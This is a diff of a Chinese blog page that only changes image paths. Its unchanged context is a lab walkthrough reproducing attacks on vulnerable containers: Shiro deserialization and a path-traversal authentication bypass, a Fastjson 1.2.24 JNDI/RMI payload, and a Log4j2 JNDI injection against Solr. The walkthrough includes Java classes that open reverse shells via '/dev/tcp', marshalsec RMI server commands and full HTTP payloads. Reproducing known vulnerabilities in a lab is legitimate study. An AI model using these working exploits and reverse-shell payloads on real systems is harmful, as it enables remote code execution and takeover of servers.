@@ -55,29 +55,29 @@
 <li>目标 classpath 存在可利用的 Gadget 链；</li>
 <li>未禁用 Java 原生反序列化或未改用安全序列化。</li>
 </ul>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="/./image/image-20251222193717805.png" alt="image-20251222193717805"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="/image/image-20251222193717805.png" alt="image-20251222193717805"></p>
 <p>抓包发现存在rememberMe&#x3D;deleteMe字段，可以确定是Shiro框架。</p>
 <p>同时ShiroScan插件可以自动检测该字段。</p>
 <h4 id="liqun"><a href="#liqun" class="headerlink" title="liqun"></a>liqun</h4><p>使用内置key检测发现可利用点</p>
-<p><img src="/./image/image-20251222194903181.png" alt="image-20251222194903181"></p>
+<p><img src="/image/image-20251222194903181.png" alt="image-20251222194903181"></p>
 <p>尝试执行命令，成功</p>
-<p><img src="/./image/image-20251222195147538.png" alt="image-20251222195147538"></p>
+<p><img src="/image/image-20251222195147538.png" alt="image-20251222195147538"></p>
 <p>在kali设置监听端口，这里使用8080端口，设置好监听端口之后，填写对应的IP和端口即可进行反弹shell</p>
-<p><img src="/./image/image-20251222195725010.png" alt="image-20251222195725010"></p>
+<p><img src="/image/image-20251222195725010.png" alt="image-20251222195725010"></p>
 <p>在kali中可以也可以看到执行成功，能够进行任意命令执行</p>
-<p><img src="/./image/image-20251222195947132.png" alt="image-20251222195947132"></p>
+<p><img src="/image/image-20251222195947132.png" alt="image-20251222195947132"></p>
 <h1 id="shiro权限绕过"><a href="#shiro权限绕过" class="headerlink" title="shiro权限绕过"></a>shiro权限绕过</h1><h3 id="核心原理-1"><a href="#核心原理-1" class="headerlink" title="核心原理"></a>核心原理</h3><ol>
 <li><strong>路径匹配差异</strong>：Shiro 的 AntPathMatcher 对 <code>/admin/*</code> 等规则采用严格字符串匹配，不自动归一化结尾 <code>/</code>；而 Spring Web 的 AntPathMatcher 通常会归一化（如 <code>/admin/</code> 与 <code>/admin</code> 视为同一路径）。例如：Shiro 拦截 <code>/admin/*</code> 不匹配 <code>/admin/123/</code>，但 Spring 仍路由到 <code>/admin/123</code> 对应的控制器，从而绕过 authc。</li>
 <li><strong>分号截断与归一化差异</strong>：Shiro 在处理含 <code>;</code> 的 URL 时会截断分号后的内容（如 <code>/admin;xxx</code> 解析为 <code>/admin</code>），而 Spring 可能保留并归一化，进一步扩大绕过面。</li>
 </ol>
 <h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>抓包发现admin路由，但是无法直接直接访问，且会重定向到登录页面。</p>
-<p><img src="/./image/image-20251222203025127.png" alt="image-20251222203025127"></p>
-<p><img src="/./image/image-20251222203121050.png" alt="image-20251222203121050"></p>
+<p><img src="/image/image-20251222203025127.png" alt="image-20251222203025127"></p>
+<p><img src="/image/image-20251222203121050.png" alt="image-20251222203121050"></p>
 <p>借助shiro和spring的路径匹配差异构造palyload：&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;</p>
 <p>在使用了shiro的项目中，是我们请求的URL（URL1），进过shiro权限检验（URL2）， 最后到springboot项目找到路由来处理（URL3）</p>
 <p>URL1会进行标准化处理，将原本的URL处理为&#x2F;xxx&#x2F;..，这时候shiro的权限检测会将他和&#x2F;admin&#x2F;进行匹配，显然不会匹配成功，这样就绕过了shiro的检测，不会再重定向。但是在springboot项目中的匹配模式不同，能够找到&#x2F;admin&#x2F;路由进行访问。</p>
 <p>这样就成功进入原本需要登录的页面</p>
-<p><img src="/./image/image-20251222205353501.png" alt="image-20251222205353501"></p>
+<p><img src="/image/image-20251222205353501.png" alt="image-20251222205353501"></p>
 <h1 id="fastjson反序列化"><a href="#fastjson反序列化" class="headerlink" title="fastjson反序列化"></a>fastjson反序列化</h1><p>Fastjson 1.2.24 反序列化导致任意命令执行漏洞</p>
 <h3 id="核心原理-2"><a href="#核心原理-2" class="headerlink" title="核心原理"></a>核心原理</h3><p>Fastjson 反序列化的核心逻辑是：将 JSON 字符串解析为 Java 对象时，支持通过 <code>@type</code> 字段指定目标类，且会<strong>自动调用该类的 setter 方法 &#x2F; 构造方法 &#x2F; 字段赋值逻辑</strong>。</p>
 <p>1.2.24 版本的关键缺陷：</p>
@@ -87,9 +87,9 @@
 <li><strong>依赖 JDK 原生类的 “gadget”（利用链）</strong>：JDK 中部分类本身包含可执行命令的逻辑，结合 Fastjson 的反序列化机制，可被拼接成完整的攻击链。</li>
 </ol>
 <h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>启动容器之后可以看到这个页面</p>
-<p><img src="/./image/image-20251222212646631.png" alt="image-20251222212646631"></p>
+<p><img src="/image/image-20251222212646631.png" alt="image-20251222212646631"></p>
 <p>创建一个test.java文件，并在jdk-8的环境下编译。</p>
-<p><img src="/./image/image-20251222212623512.png"></p>
+<p><img src="/image/image-20251222212623512.png"></p>
 <p>test.java文件的内容</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件名：test.java（必须和RMI的#test一致，大小写敏感）</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 执行简单命令：在容器/tmp下创建success文件（易验证）</span></span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] cmd = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> rt.exec(cmd);</span><br><span class="line">            p.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -97,18 +97,18 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyton -m http.server <span class="number">5623</span></span><br></pre></td></tr></table></figure>
 
 <p>这个时候我们需要启动一个<code>rmi</code>服务器，然后这个<code>rmi</code>服务器会在本机监听，如果有人远程调用<code>test</code>方法，就会访问python共享的<code>test.class</code></p>
-<p><img src="/./image/image-20251222213101340.png" alt="image-20251222213101340"></p>
+<p><img src="/image/image-20251222213101340.png" alt="image-20251222213101340"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://172.31.4.79:5623/#test&quot; 8653</span><br></pre></td></tr></table></figure>
 
 <p>最后抓包一个并修改为POST请求</p>
-<p><img src="/./image/image-20251222213237314.png" alt="image-20251222213237314"></p>
+<p><img src="/image/image-20251222213237314.png" alt="image-20251222213237314"></p>
 <p>POST请求的内容</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8081</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 158</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;b&quot;:&#123;</span><br><span class="line">          &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">          &quot;dataSourceName&quot;:&quot;rmi://172.31.4.79:8653/test&quot;,</span><br><span class="line">          &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这里看到回复是500，但是在我们的服务器中可以看见成功请求了test.class文件</p>
-<p><img src="/./image/image-20251222213316284.png" alt="image-20251222213316284"></p>
+<p><img src="/image/image-20251222213316284.png" alt="image-20251222213316284"></p>
 <p>之后进入容器，查看是否生成&#x2F;tmp&#x2F;successs。若生成则成功触发fastjson漏洞</p>
-<p><img src="/./image/image-20251222214613708.png" alt="image-20251222214613708"></p>
+<p><img src="/image/image-20251222214613708.png" alt="image-20251222214613708"></p>
 <h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>修改test.java的内容</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                    <span class="comment">//这里将命令修改为反弹shell的命令</span></span><br><span class="line">                        String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/172.31.4.79/4563 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">                        <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">                        pc.waitFor();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="comment">// do nothing</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -119,10 +119,10 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4563  # -l=监听 -v=详细输出 -n=不解析域名 -p=指定端口</span><br></pre></td></tr></table></figure>
 
 <p>重新发送payload</p>
-<p><img src="/./image/image-20251222215724374.png" alt="image-20251222215724374"></p>
+<p><img src="/image/image-20251222215724374.png" alt="image-20251222215724374"></p>
 <p>此时不显示回复内容即为反弹成功</p>
 <p>查看监听端口，可以执行任意命令即为成功</p>
-<p><img src="/./image/image-20251222215833696.png" alt="image-20251222215833696"></p>
+<p><img src="/image/image-20251222215833696.png" alt="image-20251222215833696"></p>
 <h1 id="log4j2-rce"><a href="#log4j2-rce" class="headerlink" title="log4j2 rce"></a>log4j2 rce</h1><h3 id="核心原理-3"><a href="#核心原理-3" class="headerlink" title="核心原理"></a>核心原理</h3><ol>
 <li><p><strong>Log4j2 的日志记录特性</strong>：Log4j2 支持<code>$&#123;&#125;</code>语法的 “Lookup（变量替换）” 功能，可在日志中动态解析变量（如<code>$&#123;env:USER&#125;</code>获取系统环境变量）。</p>
 </li>
@@ -139,31 +139,31 @@
 </ol>
 <h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>靶机和攻击机均为Ubuntu：172.31.4.79</p>
 <p>启动该容器可以看到该界面，很明显是使用了solr服务（一个基于 Java 的搜索引，而 Solr 默认使用 Log4j2 作为日志组件）</p>
-<p><img src="/./image/image-20251224173353063.png" alt="image-20251224173353063"></p>
+<p><img src="/image/image-20251224173353063.png" alt="image-20251224173353063"></p>
 <p>攻击机执行nc -lvvp 9999监听9999端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim Exploit.java</span><br><span class="line">javac Exploit.java -source 8 -target 8</span><br></pre></td></tr></table></figure>
 
-<p><img src="/./image/image-20251224174553425.png" alt="image-20251224174553425"></p>
+<p><img src="/image/image-20251224174553425.png" alt="image-20251224174553425"></p>
 <p>创建Exploit.java恶意文件，并编译</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 反弹 Shell 命令（替换为攻击机 IP 和端口）</span></span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] cmd = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.31.4.79/9999 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(cmd);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 忽略异常</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>在创建Exploit.java的目录启动简易的HTTP服务器</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\# Python 3 启动 HTTP 服务，端口 8080</span><br><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
 
-<p><img src="/./image/image-20251224174526631.png" alt="image-20251224174526631"></p>
+<p><img src="/image/image-20251224174526631.png" alt="image-20251224174526631"></p>
 <p>在 marshalsec 目录执行，启动 RMI 服务并指定恶意类的 HTTP 地址：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer</span><br><span class="line">&quot;http://172.31.4.79:8080/#Exploit&quot; 1099</span><br></pre></td></tr></table></figure>
 
-<p><img src="/./image/image-20251224174614874.png" alt="image-20251224174614874"></p>
+<p><img src="/image/image-20251224174614874.png" alt="image-20251224174614874"></p>
 <p>打开burp抓包，发现存在&#x2F;solr&#x2F;admin&#x2F;cores和&#x2F;solr&#x2F;admin&#x2F;info&#x2F;system，这两个是solr的核心接口。</p>
 <p>对这两个接口进行访问时，Solr 会将<strong>请求的 HTTP 头（如 User-Agent、Referer）、URL 参数</strong>等信息，通过 Log4j2 记录到日志中；之后在利用Log4j2 会解析<code>$&#123;jndi:&#125;</code>并向恶意服务器发起请求的原理进行任意命令执行。</p>
 <p>本次复现利用第一个，这个更加稳定且便于复现</p>
-<p><img src="/./image/image-20251224174852925.png" alt="image-20251224174852925"></p>
+<p><img src="/image/image-20251224174852925.png" alt="image-20251224174852925"></p>
 <p>借助GET传参将payload：**${jndi:rmi:&#x2F;&#x2F;172.31.4.79:1099&#x2F;Exploit}**传入</p>
 <p>可以看到成功发送</p>
-<p><img src="/./image/image-20251224175438765.png" alt="image-20251224175438765"></p>
+<p><img src="/image/image-20251224175438765.png" alt="image-20251224175438765"></p>
 <p>这时查看攻击机的监听端口，发现反弹成功，能够执行任意命令</p>
-<p><img src="/./image/image-20251224175630195.png" alt="image-20251224175630195"></p>
+<p><img src="/image/image-20251224175630195.png" alt="image-20251224175630195"></p>
 </div><!-- 初始化AI摘要--><!-- 传递TOC配置给前端--><script>// 创建全局TOC配置对象
 window.tocConfig = {
   empty_toc_behavior: "placeholder"
